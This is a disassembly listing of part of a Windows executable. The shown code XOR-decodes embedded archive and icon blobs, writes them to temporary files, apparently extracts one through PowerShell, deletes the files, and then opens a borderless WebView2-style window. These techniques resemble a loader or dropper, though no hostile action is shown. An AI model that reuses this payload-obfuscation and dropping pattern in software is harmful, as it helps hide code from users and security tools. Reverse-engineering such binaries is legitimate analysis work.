   140001d59:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140001d5e:	48 89 f9             	mov    %rdi,%rcx
   140001d61:	ff 15 51 5e 07 00    	call   *0x75e51(%rip)        # 140077bb8 <__imp_wsprintfW>
   140001d67:	48 89 f9             	mov    %rdi,%rcx
   140001d6a:	ff 15 68 5c 07 00    	call   *0x75c68(%rip)        # 1400779d8 <__imp_GetFileAttributesW>
   140001d70:	83 f8 ff             	cmp    $0xffffffff,%eax
   140001d73:	0f 85 50 01 00 00    	jne    140001ec9 <wWinMain+0xae9>
   140001d79:	48 8d 15 90 cb 03 00 	lea    0x3cb90(%rip),%rdx        # 14003e910 <enc_webview2_loader+0x27080>
   140001d80:	48 8d 8c 24 90 04 00 	lea    0x490(%rsp),%rcx
   140001d87:	00 
   140001d88:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   140001d8d:	ff 15 25 5e 07 00    	call   *0x75e25(%rip)        # 140077bb8 <__imp_wsprintfW>
   140001d93:	ff 15 5f 5c 07 00    	call   *0x75c5f(%rip)        # 1400779f8 <__imp_GetProcessHeap>
   140001d99:	41 b8 21 40 03 00    	mov    $0x34021,%r8d
   140001d9f:	48 89 c1             	mov    %rax,%rcx
   140001da2:	31 d2                	xor    %edx,%edx
   140001da4:	ff 15 76 5c 07 00    	call   *0x75c76(%rip)        # 140077a20 <__imp_HeapAlloc>
   140001daa:	48 85 c0             	test   %rax,%rax
   140001dad:	0f 84 16 01 00 00    	je     140001ec9 <wWinMain+0xae9>
   140001db3:	48 89 c7             	mov    %rax,%rdi
   140001db6:	48 8d 15 73 cb 03 00 	lea    0x3cb73(%rip),%rdx        # 14003e930 <enc_runtimes_zip>
   140001dbd:	41 b8 21 40 03 00    	mov    $0x34021,%r8d
   140001dc3:	48 89 c1             	mov    %rax,%rcx
   140001dc6:	e8 d5 37 00 00       	call   1400055a0 <memcpy>
   140001dcb:	b8 01 00 00 00       	mov    $0x1,%eax
   140001dd0:	48 8d 0d 39 5a 01 00 	lea    0x15a39(%rip),%rcx        # 140017810 <XOR_KEY>
   140001dd7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140001dde:	00 00 
   140001de0:	8d 50 ff             	lea    -0x1(%rax),%edx
   140001de3:	83 e2 0e             	and    $0xe,%edx
   140001de6:	0f b6 14 0a          	movzbl (%rdx,%rcx,1),%edx
   140001dea:	30 54 07 ff          	xor    %dl,-0x1(%rdi,%rax,1)
   140001dee:	48 3d 21 40 03 00    	cmp    $0x34021,%rax
   140001df4:	74 12                	je     140001e08 <wWinMain+0xa28>
   140001df6:	89 c2                	mov    %eax,%edx
   140001df8:	83 e2 0f             	and    $0xf,%edx
   140001dfb:	0f b6 14 0a          	movzbl (%rdx,%rcx,1),%edx
   140001dff:	30 14 07             	xor    %dl,(%rdi,%rax,1)
   140001e02:	48 83 c0 02          	add    $0x2,%rax
   140001e06:	eb d8                	jmp    140001de0 <wWinMain+0xa00>
   140001e08:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140001e0f:	00 00 
   140001e11:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   140001e18:	00 
   140001e19:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   140001e20:	00 
   140001e21:	48 8d 8c 24 90 04 00 	lea    0x490(%rsp),%rcx
   140001e28:	00 
   140001e29:	ba 00 00 00 40       	mov    $0x40000000,%edx
   140001e2e:	45 31 c0             	xor    %r8d,%r8d
   140001e31:	45 31 c9             	xor    %r9d,%r9d
   140001e34:	ff 15 56 5b 07 00    	call   *0x75b56(%rip)        # 140077990 <__imp_CreateFileW>
   140001e3a:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140001e3e:	74 34                	je     140001e74 <wWinMain+0xa94>
   140001e40:	48 89 c3             	mov    %rax,%rbx
   140001e43:	c7 44 24 6c 00 00 00 	movl   $0x0,0x6c(%rsp)
   140001e4a:	00 
   140001e4b:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001e52:	00 00 
   140001e54:	4c 8d 4c 24 6c       	lea    0x6c(%rsp),%r9
   140001e59:	48 89 c1             	mov    %rax,%rcx
   140001e5c:	48 89 fa             	mov    %rdi,%rdx
   140001e5f:	41 b8 21 40 03 00    	mov    $0x34021,%r8d
   140001e65:	ff 15 15 5c 07 00    	call   *0x75c15(%rip)        # 140077a80 <__imp_WriteFile>
   140001e6b:	48 89 d9             	mov    %rbx,%rcx
   140001e6e:	ff 15 0c 5b 07 00    	call   *0x75b0c(%rip)        # 140077980 <__imp_CloseHandle>
   140001e74:	ff 15 7e 5b 07 00    	call   *0x75b7e(%rip)        # 1400779f8 <__imp_GetProcessHeap>
   140001e7a:	48 89 c1             	mov    %rax,%rcx
   140001e7d:	31 d2                	xor    %edx,%edx
   140001e7f:	49 89 f8             	mov    %rdi,%r8
   140001e82:	ff 15 a0 5b 07 00    	call   *0x75ba0(%rip)        # 140077a28 <__imp_HeapFree>
   140001e88:	48 8d 8c 24 90 04 00 	lea    0x490(%rsp),%rcx
   140001e8f:	00 
   140001e90:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140001e95:	e8 36 14 00 00       	call   1400032d0 <run_ps_extract>
   140001e9a:	85 c0                	test   %eax,%eax
   140001e9c:	75 1d                	jne    140001ebb <wWinMain+0xadb>
   140001e9e:	b9 d0 07 00 00       	mov    $0x7d0,%ecx
   140001ea3:	ff 15 af 5b 07 00    	call   *0x75baf(%rip)        # 140077a58 <__imp_Sleep>
   140001ea9:	48 8d 8c 24 90 04 00 	lea    0x490(%rsp),%rcx
   140001eb0:	00 
   140001eb1:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140001eb6:	e8 15 14 00 00       	call   1400032d0 <run_ps_extract>
   140001ebb:	48 8d 8c 24 90 04 00 	lea    0x490(%rsp),%rcx
   140001ec2:	00 
   140001ec3:	ff 15 df 5a 07 00    	call   *0x75adf(%rip)        # 1400779a8 <__imp_DeleteFileW>
   140001ec9:	0f 57 f6             	xorps  %xmm6,%xmm6
   140001ecc:	0f 11 b4 24 90 02 00 	movups %xmm6,0x290(%rsp)
   140001ed3:	00 
   140001ed4:	0f 11 b4 24 a0 02 00 	movups %xmm6,0x2a0(%rsp)
   140001edb:	00 
   140001edc:	0f 11 b4 24 b0 02 00 	movups %xmm6,0x2b0(%rsp)
   140001ee3:	00 
   140001ee4:	48 c7 84 24 c0 02 00 	movq   $0x0,0x2c0(%rsp)
   140001eeb:	00 00 00 00 00 
   140001ef0:	48 b8 50 00 00 00 03 	movabs $0x300000050,%rax
   140001ef7:	00 00 00 
   140001efa:	48 89 84 24 80 02 00 	mov    %rax,0x280(%rsp)
   140001f01:	00 
   140001f02:	48 8d 05 37 03 00 00 	lea    0x337(%rip),%rax        # 140002240 <MainProc>
   140001f09:	48 89 84 24 88 02 00 	mov    %rax,0x288(%rsp)
   140001f10:	00 
   140001f11:	48 89 b4 24 98 02 00 	mov    %rsi,0x298(%rsp)
   140001f18:	00 
   140001f19:	48 8b 05 98 81 07 00 	mov    0x78198(%rip),%rax        # 14007a0b8 <g+0x10>
   140001f20:	48 89 84 24 a0 02 00 	mov    %rax,0x2a0(%rsp)
   140001f27:	00 
   140001f28:	48 8b 05 91 81 07 00 	mov    0x78191(%rip),%rax        # 14007a0c0 <g+0x18>
   140001f2f:	48 89 84 24 c8 02 00 	mov    %rax,0x2c8(%rsp)
   140001f36:	00 
   140001f37:	ba 00 7f 00 00       	mov    $0x7f00,%edx
   140001f3c:	31 c9                	xor    %ecx,%ecx
   140001f3e:	ff 15 ec 5b 07 00    	call   *0x75bec(%rip)        # 140077b30 <__imp_LoadCursorW>
   140001f44:	48 89 84 24 a8 02 00 	mov    %rax,0x2a8(%rsp)
   140001f4b:	00 
   140001f4c:	48 8d 3d f7 4e 01 00 	lea    0x14ef7(%rip),%rdi        # 140016e4a <enc_ico_data+0x969a>
   140001f53:	48 89 bc 24 c0 02 00 	mov    %rdi,0x2c0(%rsp)
   140001f5a:	00 
   140001f5b:	48 8d 8c 24 80 02 00 	lea    0x280(%rsp),%rcx
   140001f62:	00 
   140001f63:	ff 15 ef 5b 07 00    	call   *0x75bef(%rip)        # 140077b58 <__imp_RegisterClassExW>
   140001f69:	31 c9                	xor    %ecx,%ecx
   140001f6b:	41 ff d6             	call   *%r14
   140001f6e:	89 c3                	mov    %eax,%ebx
   140001f70:	b9 01 00 00 00       	mov    $0x1,%ecx
   140001f75:	41 ff d6             	call   *%r14
   140001f78:	8b 0d 92 81 07 00    	mov    0x78192(%rip),%ecx        # 14007a110 <S_WND_W>
   140001f7e:	29 cb                	sub    %ecx,%ebx
   140001f80:	89 da                	mov    %ebx,%edx
   140001f82:	c1 ea 1f             	shr    $0x1f,%edx
   140001f85:	01 da                	add    %ebx,%edx
   140001f87:	d1 fa                	sar    $1,%edx
   140001f89:	44 8b 05 84 81 07 00 	mov    0x78184(%rip),%r8d        # 14007a114 <S_WND_H>
   140001f90:	44 29 c0             	sub    %r8d,%eax
   140001f93:	41 89 c1             	mov    %eax,%r9d
   140001f96:	41 c1 e9 1f          	shr    $0x1f,%r9d
   140001f9a:	41 01 c1             	add    %eax,%r9d
   140001f9d:	41 d1 f9             	sar    $1,%r9d
   140001fa0:	48 89 74 24 50       	mov    %rsi,0x50(%rsp)
   140001fa5:	0f 11 74 24 40       	movups %xmm6,0x40(%rsp)
   140001faa:	44 89 44 24 38       	mov    %r8d,0x38(%rsp)
   140001faf:	89 4c 24 30          	mov    %ecx,0x30(%rsp)
   140001fb3:	44 89 4c 24 28       	mov    %r9d,0x28(%rsp)
   140001fb8:	89 54 24 20          	mov    %edx,0x20(%rsp)
   140001fbc:	48 c7 44 24 58 00 00 	movq   $0x0,0x58(%rsp)
   140001fc3:	00 00 
   140001fc5:	4c 8d 05 92 4e 01 00 	lea    0x14e92(%rip),%r8        # 140016e5e <enc_ico_data+0x96ae>
   140001fcc:	31 c9                	xor    %ecx,%ecx
   140001fce:	48 89 fa             	mov    %rdi,%rdx
   140001fd1:	41 b9 00 00 00 90    	mov    $0x90000000,%r9d
   140001fd7:	ff 15 cb 5a 07 00    	call   *0x75acb(%rip)        # 140077aa8 <__imp_CreateWindowExW>
   140001fdd:	48 89 c6             	mov    %rax,%rsi
   140001fe0:	4c 8b 0d d1 80 07 00 	mov    0x780d1(%rip),%r9        # 14007a0b8 <g+0x10>
   140001fe7:	4d 85 c9             	test   %r9,%r9
   140001fea:	74 14                	je     140002000 <wWinMain+0xc20>
   140001fec:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001ff2:	48 89 f1             	mov    %rsi,%rcx
   140001ff5:	ba 80 00 00 00       	mov    $0x80,%edx
   140001ffa:	ff 15 78 5b 07 00    	call   *0x75b78(%rip)        # 140077b78 <__imp_SendMessageW>
   140002000:	4c 8b 0d b9 80 07 00 	mov    0x780b9(%rip),%r9        # 14007a0c0 <g+0x18>
   140002007:	4d 85 c9             	test   %r9,%r9
   14000200a:	74 11                	je     14000201d <wWinMain+0xc3d>
   14000200c:	48 89 f1             	mov    %rsi,%rcx
   14000200f:	ba 80 00 00 00       	mov    $0x80,%edx
   140002014:	45 31 c0             	xor    %r8d,%r8d
   140002017:	ff 15 5b 5b 07 00    	call   *0x75b5b(%rip)        # 140077b78 <__imp_SendMessageW>
   14000201d:	48 89 f1             	mov    %rsi,%rcx
   140002020:	ba 05 00 00 00       	mov    $0x5,%edx
   140002025:	ff 15 6d 5b 07 00    	call   *0x75b6d(%rip)        # 140077b98 <__imp_ShowWindow>
   14000202b:	48 89 f1             	mov    %rsi,%rcx
   14000202e:	ff 15 7c 5b 07 00    	call   *0x75b7c(%rip)        # 140077bb0 <__imp_UpdateWindow>
   140002034:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140002039:	31 d2                	xor    %edx,%edx
   14000203b:	45 31 c0             	xor    %r8d,%r8d
   14000203e:	45 31 c9             	xor    %r9d,%r9d
   140002041:	ff 15 b9 5a 07 00    	call   *0x75ab9(%rip)        # 140077b00 <__imp_GetMessageW>
   140002047:	85 c0                	test   %eax,%eax
   140002049:	74 41                	je     14000208c <wWinMain+0xcac>
   14000204b:	48 8d 74 24 70       	lea    0x70(%rsp),%rsi
   140002050:	48 8b 3d 51 5b 07 00 	mov    0x75b51(%rip),%rdi        # 140077ba8 <__imp_TranslateMessage>
   140002057:	48 8b 1d 6a 5a 07 00 	mov    0x75a6a(%rip),%rbx        # 140077ac8 <__imp_DispatchMessageW>
   14000205e:	4c 8b 35 9b 5a 07 00 	mov    0x75a9b(%rip),%r14        # 140077b00 <__imp_GetMessageW>
   140002065:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000206c:	00 00 00 00 
   140002070:	48 89 f1             	mov    %rsi,%rcx
   140002073:	ff d7                	call   *%rdi
   140002075:	48 89 f1             	mov    %rsi,%rcx
   140002078:	ff d3                	call   *%rbx
   14000207a:	48 89 f1             	mov    %rsi,%rcx
   14000207d:	31 d2                	xor    %edx,%edx
   14000207f:	45 31 c0             	xor    %r8d,%r8d
   140002082:	45 31 c9             	xor    %r9d,%r9d
   140002085:	41 ff d6             	call   *%r14
   140002088:	85 c0                	test   %eax,%eax
   14000208a:	75 e4                	jne    140002070 <wWinMain+0xc90>
   14000208c:	48 8b 0d 1d 80 07 00 	mov    0x7801d(%rip),%rcx        # 14007a0b0 <g+0x8>
   140002093:	48 85 c9             	test   %rcx,%rcx
   140002096:	74 06                	je     14000209e <wWinMain+0xcbe>
   140002098:	ff 15 72 5b 07 00    	call   *0x75b72(%rip)        # 140077c10 <__imp_DeleteObject>
   14000209e:	48 8b 0d 13 80 07 00 	mov    0x78013(%rip),%rcx        # 14007a0b8 <g+0x10>
   1400020a5:	48 85 c9             	test   %rcx,%rcx
   1400020a8:	74 06                	je     1400020b0 <wWinMain+0xcd0>
   1400020aa:	ff 15 08 5a 07 00    	call   *0x75a08(%rip)        # 140077ab8 <__imp_DestroyIcon>
   1400020b0:	48 8b 0d 09 80 07 00 	mov    0x78009(%rip),%rcx        # 14007a0c0 <g+0x18>
   1400020b7:	48 85 c9             	test   %rcx,%rcx
   1400020ba:	74 06                	je     1400020c2 <wWinMain+0xce2>
   1400020bc:	ff 15 f6 59 07 00    	call   *0x759f6(%rip)        # 140077ab8 <__imp_DestroyIcon>
   1400020c2:	ff 15 98 58 07 00    	call   *0x75898(%rip)        # 140077960 <__imp_CoUninitialize>
   1400020c8:	8b 84 24 80 00 00 00 	mov    0x80(%rsp),%eax
   1400020cf:	0f 28 b4 24 a0 06 00 	movaps 0x6a0(%rsp),%xmm6
   1400020d6:	00 
   1400020d7:	48 81 c4 b0 06 00 00 	add    $0x6b0,%rsp
   1400020de:	5b                   	pop    %rbx
   1400020df:	5f                   	pop    %rdi
   1400020e0:	5e                   	pop    %rsi
   1400020e1:	41 5e                	pop    %r14
   1400020e3:	41 5f                	pop    %r15
   1400020e5:	c3                   	ret
   1400020e6:	b9 0b 00 00 00       	mov    $0xb,%ecx
   1400020eb:	ff 15 17 5a 07 00    	call   *0x75a17(%rip)        # 140077b08 <__imp_GetSystemMetrics>
   1400020f1:	48 89 f9             	mov    %rdi,%rcx
   1400020f4:	89 c2                	mov    %eax,%edx
   1400020f6:	e8 45 00 00 00       	call   140002140 <ico_from_data>
   1400020fb:	48 89 05 b6 7f 07 00 	mov    %rax,0x77fb6(%rip)        # 14007a0b8 <g+0x10>
   140002102:	48 83 3d b6 7f 07 00 	cmpq   $0x0,0x77fb6(%rip)        # 14007a0c0 <g+0x18>
   140002109:	00 
   14000210a:	0f 85 a2 fa ff ff    	jne    140001bb2 <wWinMain+0x7d2>
   140002110:	b9 31 00 00 00       	mov    $0x31,%ecx
   140002115:	ff 15 ed 59 07 00    	call   *0x759ed(%rip)        # 140077b08 <__imp_GetSystemMetrics>
   14000211b:	48 89 f9             	mov    %rdi,%rcx
   14000211e:	89 c2                	mov    %eax,%edx
   140002120:	e8 1b 00 00 00       	call   140002140 <ico_from_data>
   140002125:	48 89 05 94 7f 07 00 	mov    %rax,0x77f94(%rip)        # 14007a0c0 <g+0x18>
   14000212c:	e9 81 fa ff ff       	jmp    140001bb2 <wWinMain+0x7d2>
   140002131:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140002138:	0f 1f 84 00 00 00 00 
   14000213f:	00 

0000000140002140 <ico_from_data>:
   140002140:	41 56                	push   %r14
   140002142:	56                   	push   %rsi
   140002143:	57                   	push   %rdi
   140002144:	53                   	push   %rbx
   140002145:	48 81 ec 58 04 00 00 	sub    $0x458,%rsp
   14000214c:	89 d6                	mov    %edx,%esi
   14000214e:	48 89 cf             	mov    %rcx,%rdi
   140002151:	48 8d 9c 24 50 02 00 	lea    0x250(%rsp),%rbx
   140002158:	00 
   140002159:	b9 04 01 00 00       	mov    $0x104,%ecx
   14000215e:	48 89 da             	mov    %rbx,%rdx
   140002161:	ff 15 a9 58 07 00    	call   *0x758a9(%rip)        # 140077a10 <__imp_GetTempPathW>
   140002167:	48 8d 15 b2 56 01 00 	lea    0x156b2(%rip),%rdx        # 140017820 <XOR_KEY+0x10>
   14000216e:	4c 8d 74 24 40       	lea    0x40(%rsp),%r14
   140002173:	4c 89 f1             	mov    %r14,%rcx
   140002176:	49 89 d8             	mov    %rbx,%r8
   140002179:	41 89 f1             	mov    %esi,%r9d
   14000217c:	ff 15 36 5a 07 00    	call   *0x75a36(%rip)        # 140077bb8 <__imp_wsprintfW>
   140002182:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140002189:	00 00 
   14000218b:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   140002192:	00 
   140002193:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   14000219a:	00 
   14000219b:	31 db                	xor    %ebx,%ebx
   14000219d:	4c 89 f1             	mov    %r14,%rcx
   1400021a0:	ba 00 00 00 40       	mov    $0x40000000,%edx
   1400021a5:	45 31 c0             	xor    %r8d,%r8d
   1400021a8:	45 31 c9             	xor    %r9d,%r9d
   1400021ab:	ff 15 df 57 07 00    	call   *0x757df(%rip)        # 140077990 <__imp_CreateFileW>
   1400021b1:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400021b5:	74 73                	je     14000222a <ico_from_data+0xea>
   1400021b7:	49 89 c6             	mov    %rax,%r14
   1400021ba:	c7 44 24 3c 00 00 00 	movl   $0x0,0x3c(%rsp)
   1400021c1:	00 
   1400021c2:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400021c9:	00 00 
   1400021cb:	4c 8d 4c 24 3c       	lea    0x3c(%rsp),%r9
   1400021d0:	48 89 c1             	mov    %rax,%rcx
   1400021d3:	48 89 fa             	mov    %rdi,%rdx
   1400021d6:	41 b8 9a 96 00 00    	mov    $0x969a,%r8d
   1400021dc:	ff 15 9e 58 07 00    	call   *0x7589e(%rip)        # 140077a80 <__imp_WriteFile>
   1400021e2:	4c 89 f1             	mov    %r14,%rcx
   1400021e5:	ff 15 95 57 07 00    	call   *0x75795(%rip)        # 140077980 <__imp_CloseHandle>
   1400021eb:	81 7c 24 3c 9a 96 00 	cmpl   $0x969a,0x3c(%rsp)
   1400021f2:	00 
   1400021f3:	75 33                	jne    140002228 <ico_from_data+0xe8>
   1400021f5:	89 74 24 20          	mov    %esi,0x20(%rsp)
   1400021f9:	c7 44 24 28 10 00 00 	movl   $0x10,0x28(%rsp)
   140002200:	00 
   140002201:	48 8d 7c 24 40       	lea    0x40(%rsp),%rdi
   140002206:	31 c9                	xor    %ecx,%ecx
   140002208:	48 89 fa             	mov    %rdi,%rdx
   14000220b:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140002211:	41 89 f1             	mov    %esi,%r9d
   140002214:	ff 15 1e 59 07 00    	call   *0x7591e(%rip)        # 140077b38 <__imp_LoadImageW>
   14000221a:	48 89 c3             	mov    %rax,%rbx
   14000221d:	48 89 f9             	mov    %rdi,%rcx
   140002220:	ff 15 82 57 07 00    	call   *0x75782(%rip)        # 1400779a8 <__imp_DeleteFileW>
   140002226:	eb 02                	jmp    14000222a <ico_from_data+0xea>
   140002228:	31 db                	xor    %ebx,%ebx
   14000222a:	48 89 d8             	mov    %rbx,%rax
   14000222d:	48 81 c4 58 04 00 00 	add    $0x458,%rsp
   140002234:	5b                   	pop    %rbx
   140002235:	5f                   	pop    %rdi
   140002236:	5e                   	pop    %rsi
   140002237:	41 5e                	pop    %r14
   140002239:	c3                   	ret
   14000223a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000140002240 <MainProc>:
   140002240:	41 57                	push   %r15
   140002242:	41 56                	push   %r14
   140002244:	41 55                	push   %r13
   140002246:	41 54                	push   %r12
   140002248:	56                   	push   %rsi
   140002249:	57                   	push   %rdi
   14000224a:	55                   	push   %rbp
   14000224b:	53                   	push   %rbx
   14000224c:	48 81 ec a8 01 00 00 	sub    $0x1a8,%rsp
   140002253:	0f 29 bc 24 90 01 00 	movaps %xmm7,0x190(%rsp)
   14000225a:	00 
   14000225b:	0f 29 b4 24 80 01 00 	movaps %xmm6,0x180(%rsp)
   140002262:	00 
   140002263:	89 d7                	mov    %edx,%edi
   140002265:	49 89 cc             	mov    %rcx,%r12
   140002268:	81 fa 12 01 00 00    	cmp    $0x112,%edx
   14000226e:	7f 73                	jg     1400022e3 <MainProc+0xa3>
   140002270:	8d 47 ff             	lea    -0x1(%rdi),%eax
   140002273:	83 f8 1f             	cmp    $0x1f,%eax
   140002276:	0f 87 1e 10 00 00    	ja     14000329a <MainProc+0x105a>
   14000227c:	41 be 01 00 00 00    	mov    $0x1,%r14d
   140002282:	48 8d 0d 7f 3e 00 00 	lea    0x3e7f(%rip),%rcx        # 140006108 <.refptr._newmode+0x78>
   140002289:	48 63 04 81          	movslq (%rcx,%rax,4),%rax
   14000228d:	48 01 c8             	add    %rcx,%rax
   140002290:	ff e0                	jmp    *%rax
   140002292:	8b 05 78 7e 07 00    	mov    0x77e78(%rip),%eax        # 14007a110 <S_WND_W>
   140002298:	8b 0d 7e 7e 07 00    	mov    0x77e7e(%rip),%ecx        # 14007a11c <S_CLOSE_SZ>
   14000229e:	89 c2                	mov    %eax,%edx
   1400022a0:	29 ca                	sub    %ecx,%edx
   1400022a2:	89 15 28 7e 07 00    	mov    %edx,0x77e28(%rip)        # 14007a0d0 <g+0x28>
   1400022a8:	c7 05 22 7e 07 00 00 	movl   $0x0,0x77e22(%rip)        # 14007a0d4 <g+0x2c>
   1400022af:	00 00 00 
   1400022b2:	89 05 20 7e 07 00    	mov    %eax,0x77e20(%rip)        # 14007a0d8 <g+0x30>
   1400022b8:	89 0d 1e 7e 07 00    	mov    %ecx,0x77e1e(%rip)        # 14007a0dc <g+0x34>
   1400022be:	8b 05 54 7e 07 00    	mov    0x77e54(%rip),%eax        # 14007a118 <S_TOP_BAR_H>
   1400022c4:	48 c7 05 21 7e 07 00 	movq   $0x0,0x77e21(%rip)        # 14007a0f0 <g+0x48>
   1400022cb:	00 00 00 00 
   1400022cf:	89 15 23 7e 07 00    	mov    %edx,0x77e23(%rip)        # 14007a0f8 <g+0x50>
   1400022d5:	89 05 21 7e 07 00    	mov    %eax,0x77e21(%rip)        # 14007a0fc <g+0x54>
   1400022db:	45 31 f6             	xor    %r14d,%r14d
   1400022de:	e9 c5 0f 00 00       	jmp    1400032a8 <MainProc+0x1068>
   1400022e3:	81 ff 00 02 00 00    	cmp    $0x200,%edi
   1400022e9:	7f 67                	jg     140002352 <MainProc+0x112>
   1400022eb:	81 ff 13 01 00 00    	cmp    $0x113,%edi
   1400022f1:	0f 84 7e 02 00 00    	je     140002575 <MainProc+0x335>
   1400022f7:	81 ff 00 02 00 00    	cmp    $0x200,%edi
   1400022fd:	0f 85 97 0f 00 00    	jne    14000329a <MainProc+0x105a>
   140002303:	41 0f bf f9          	movswl %r9w,%edi
   140002307:	41 c1 f9 10          	sar    $0x10,%r9d
   14000230b:	49 c1 e1 20          	shl    $0x20,%r9
   14000230f:	4c 09 cf             	or     %r9,%rdi
   140002312:	48 8d 0d b7 7d 07 00 	lea    0x77db7(%rip),%rcx        # 14007a0d0 <g+0x28>
   140002319:	48 8b 35 30 58 07 00 	mov    0x75830(%rip),%rsi        # 140077b50 <__imp_PtInRect>
   140002320:	48 89 fa             	mov    %rdi,%rdx
   140002323:	ff d6                	call   *%rsi
   140002325:	89 c3                	mov    %eax,%ebx
   140002327:	48 8d 0d b2 7d 07 00 	lea    0x77db2(%rip),%rcx        # 14007a0e0 <g+0x38>
   14000232e:	48 89 fa             	mov    %rdi,%rdx
   140002331:	ff d6                	call   *%rsi
   140002333:	89 c7                	mov    %eax,%edi
   140002335:	3b 1d c5 7d 07 00    	cmp    0x77dc5(%rip),%ebx        # 14007a100 <g+0x58>
   14000233b:	0f 85 b3 02 00 00    	jne    1400025f4 <MainProc+0x3b4>
   140002341:	3b 3d bd 7d 07 00    	cmp    0x77dbd(%rip),%edi        # 14007a104 <g+0x5c>
   140002347:	0f 85 cc 02 00 00    	jne    140002619 <MainProc+0x3d9>
   14000234d:	e9 db 02 00 00       	jmp    14000262d <MainProc+0x3ed>
   140002352:	81 ff 01 02 00 00    	cmp    $0x201,%edi
   140002358:	0f 84 57 02 00 00    	je     1400025b5 <MainProc+0x375>
   14000235e:	81 ff a3 02 00 00    	cmp    $0x2a3,%edi
   140002364:	0f 85 30 0f 00 00    	jne    14000329a <MainProc+0x105a>
   14000236a:	c7 05 98 7d 07 00 00 	movl   $0x0,0x77d98(%rip)        # 14007a10c <g+0x64>
   140002371:	00 00 00 
   140002374:	8b 05 8a 7d 07 00    	mov    0x77d8a(%rip),%eax        # 14007a104 <g+0x5c>
   14000237a:	0b 05 80 7d 07 00    	or     0x77d80(%rip),%eax        # 14007a100 <g+0x58>
   140002380:	0f 84 b4 02 00 00    	je     14000263a <MainProc+0x3fa>
   140002386:	48 c7 05 6f 7d 07 00 	movq   $0x0,0x77d6f(%rip)        # 14007a100 <g+0x58>
   14000238d:	00 00 00 00 
   140002391:	45 31 f6             	xor    %r14d,%r14d
   140002394:	ba 01 00 00 00       	mov    $0x1,%edx
   140002399:	4c 89 e1             	mov    %r12,%rcx
   14000239c:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   1400023a2:	45 31 c9             	xor    %r9d,%r9d
   1400023a5:	ff 15 e5 57 07 00    	call   *0x757e5(%rip)        # 140077b90 <__imp_SetTimer>
   1400023ab:	4c 89 e1             	mov    %r12,%rcx
   1400023ae:	31 d2                	xor    %edx,%edx
   1400023b0:	e9 7f 04 00 00       	jmp    140002834 <MainProc+0x5f4>
   1400023b5:	48 8b 0d a4 7d 07 00 	mov    0x77da4(%rip),%rcx        # 14007a160 <g_wv>
   1400023bc:	48 85 c9             	test   %rcx,%rcx
   1400023bf:	0f 84 1f 02 00 00    	je     1400025e4 <MainProc+0x3a4>
   1400023c5:	ff 15 55 57 07 00    	call   *0x75755(%rip)        # 140077b20 <__imp_IsWindow>
   1400023cb:	85 c0                	test   %eax,%eax
   1400023cd:	0f 84 11 02 00 00    	je     1400025e4 <MainProc+0x3a4>
   1400023d3:	48 8b 0d 86 7d 07 00 	mov    0x77d86(%rip),%rcx        # 14007a160 <g_wv>
   1400023da:	ff 15 e0 56 07 00    	call   *0x756e0(%rip)        # 140077ac0 <__imp_DestroyWindow>
   1400023e0:	e9 ff 01 00 00       	jmp    1400025e4 <MainProc+0x3a4>
   1400023e5:	66 41 83 f9 01       	cmp    $0x1,%r9w
   1400023ea:	0f 85 aa 0e 00 00    	jne    14000329a <MainProc+0x105a>
   1400023f0:	4c 89 c6             	mov    %r8,%rsi
   1400023f3:	4d 89 cf             	mov    %r9,%r15
   1400023f6:	48 8d 9c 24 b0 00 00 	lea    0xb0(%rsp),%rbx
   1400023fd:	00 
   1400023fe:	48 89 d9             	mov    %rbx,%rcx
   140002401:	ff 15 e9 56 07 00    	call   *0x756e9(%rip)        # 140077af0 <__imp_GetCursorPos>
   140002407:	4c 89 e1             	mov    %r12,%rcx
   14000240a:	48 89 da             	mov    %rbx,%rdx
   14000240d:	ff 15 5d 57 07 00    	call   *0x7575d(%rip)        # 140077b70 <__imp_ScreenToClient>
   140002413:	48 8b 94 24 b0 00 00 	mov    0xb0(%rsp),%rdx
   14000241a:	00 
   14000241b:	48 8d 0d ae 7c 07 00 	lea    0x77cae(%rip),%rcx        # 14007a0d0 <g+0x28>
   140002422:	ff 15 28 57 07 00    	call   *0x75728(%rip)        # 140077b50 <__imp_PtInRect>
   140002428:	85 c0                	test   %eax,%eax
   14000242a:	75 1d                	jne    140002449 <MainProc+0x209>
   14000242c:	48 8b 94 24 b0 00 00 	mov    0xb0(%rsp),%rdx
   140002433:	00 
   140002434:	48 8d 0d a5 7c 07 00 	lea    0x77ca5(%rip),%rcx        # 14007a0e0 <g+0x38>
   14000243b:	ff 15 0f 57 07 00    	call   *0x7570f(%rip)        # 140077b50 <__imp_PtInRect>
   140002441:	85 c0                	test   %eax,%eax
   140002443:	0f 84 4b 0e 00 00    	je     140003294 <MainProc+0x1054>
   140002449:	ba 89 7f 00 00       	mov    $0x7f89,%edx
   14000244e:	31 c9                	xor    %ecx,%ecx
   140002450:	ff 15 da 56 07 00    	call   *0x756da(%rip)        # 140077b30 <__imp_LoadCursorW>
   140002456:	48 89 c1             	mov    %rax,%rcx
   140002459:	ff 15 21 57 07 00    	call   *0x75721(%rip)        # 140077b80 <__imp_SetCursor>
   14000245f:	e9 44 0e 00 00       	jmp    1400032a8 <MainProc+0x1068>
